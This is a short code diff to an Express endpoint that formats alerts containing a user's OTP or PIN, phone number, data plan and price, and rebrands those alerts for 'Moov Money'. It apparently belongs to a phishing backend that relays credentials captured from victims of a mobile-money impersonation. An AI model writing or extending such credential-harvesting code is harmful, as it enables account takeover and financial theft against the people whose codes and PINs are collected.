@@ -85,7 +85,8 @@ app.post('/api/request-approval', async (req, res) => {
        ? `🔑 OTP : \`${otp || '—'}\`\n`
 : `🔑 pin: \`${code || '—'}\`\n`;
     const text =
-      `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
+      `🔔 *moov Login Attempt — ${stepLabel}*\n\n` +
+      `💳 Payment: Moov Money\n` +
       `📦 Data: ${plan || '—'}\n` +
       `💰 Price: ${displayPrice}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
